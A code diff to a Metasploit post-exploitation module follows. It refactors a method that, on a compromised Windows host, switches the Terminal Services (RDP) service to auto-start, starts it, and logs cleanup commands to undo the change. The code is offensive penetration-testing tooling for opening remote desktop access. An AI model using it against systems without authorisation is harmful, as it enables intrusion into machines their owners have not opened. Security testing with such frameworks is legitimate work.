@@ -84,17 +84,20 @@ class Metasploit3 < Msf::Post
 
 
   def enabletssrv(cleanup_rc)
-    rdp_key = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\TermService"
+    service_name = "termservice"
+    srv_info = service_info(service_name)
     begin
-      v2 = registry_getvaldata(rdp_key,"Start")
       print_status "Setting Terminal Services service startup mode"
-      if v2 != 2
+      if srv_info[:starttype] != START_TYPE_AUTO
         print_status "\tThe Terminal Services service is not set to auto, changing it to auto ..."
-        service_change_startup("TermService","auto")
+        unless (service_change_config(service_name, {:starttype => "START_TYPE_AUTO"}) == Windows::Error::SUCCESS)
+          print_error("\tUnable to change start type to Auto")
+        end
         file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc config termservice start= disabled\"")
-        cmd_exec("sc", "start termservice", 30)
+        if (service_start(service_name) == Windows::Error::SUCCESS)
+          print_good("\tRDP Service Started")
+        end
         file_local_write(cleanup_rc,"execute -H -f cmd.exe -a \"/c sc stop termservice\"")
-
       else
         print_status "\tTerminal Services service is already set to auto"
       end
